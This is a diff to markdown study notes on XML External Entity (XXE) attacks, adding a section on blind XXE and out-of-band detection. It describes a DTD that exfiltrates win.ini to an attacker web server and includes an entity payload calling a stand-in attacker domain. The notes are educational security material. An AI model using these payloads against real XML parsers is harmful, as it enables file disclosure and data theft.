@@ -1,11 +1,13 @@
-# What is XXE?
+# Vulnerability: XXE 
+
 XXE = XML External Entity
 
 This is a type of attack that targets `XML`[extensible markup language] parsers. The attack works by loading an `External Entity` into valid `XML`. This attack can lead to `data disclosure`, `dos`,`ssrf` and even `port scanning` of local resources.
 
-# XML and its ENTITYs
+## XML and its ENTITYs
 
 ### XML Entities
+
 A way of representing an item of data within an `XML` doc. Certain entities are built in to the spec i.e `&lt;` and `&gt;` represent the chars `< >`, these are metachars use to denote `XML` tags and must be represented using their entities when they appear in data.
 
 ```xml
@@ -155,6 +157,22 @@ And here is what that `payload.dtd` contains
 - The code within payload.dtd is parsed by the XML parser, which reads the contents of win.ini and sends it as a parameter in an HTTP GET request back to `https://evil-webserver.com`
 
 The extracted data can be viewed by the attacker in their web server logs.
+
+# Blind XXE
+
+In many cases XXE will be blind, meaning the application will not return the values of any defined external entities in its response. Bling XXE vulns can still be detected and exploited, but more advanced techniques are required. 
+
+	- Trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data
+	- Trigger XML parsing errors in such a way that the error messages contain sensitive data
+
+### Out of band techniques
+
+Def. an external entitity: 
+
+` <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]> `
+
+
+
 
 ## Learn more 
 
